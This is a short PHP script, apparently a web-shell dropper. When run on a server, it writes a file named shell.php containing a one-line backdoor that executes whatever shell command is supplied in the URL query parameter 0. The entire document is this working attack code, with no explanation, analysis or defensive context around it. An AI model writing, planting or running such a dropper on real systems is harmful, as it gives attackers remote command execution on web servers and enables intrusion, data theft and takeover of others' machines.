 <?php
$myfile = fopen("shell.php", "w") or die("Unable to open file!");
$txt = "<?=`$_GET[0]`;";
fwrite($myfile, $txt);
fclose($myfile);
?> 
